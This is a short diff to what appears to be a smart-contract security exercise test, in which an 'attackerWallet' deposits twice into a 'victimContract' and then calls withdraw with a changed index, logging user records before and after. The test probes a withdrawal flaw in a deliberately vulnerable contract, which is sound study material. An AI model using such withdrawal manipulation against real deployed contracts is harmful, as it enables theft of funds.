@@ -27,11 +27,16 @@ describe(NAME, function () {
             const victimContractWithSignature = victimContract.connect(attackerWallet);
 
             await victimContractWithSignature.deposit();
+            await victimContractWithSignature.deposit();
             users1 = await victimContract.users(0);
             users2 = await victimContract.users(1);
+            users3 = await victimContract.users(2);
             console.log(users2);
             console.log(users1);
-            await victimContractWithSignature.withdraw(1);
+            await victimContractWithSignature.withdraw(2);
+
+            console.log("after withdraw", users2);
+            console.log("after withdraw", users1);
         });
 
         after(async function () {
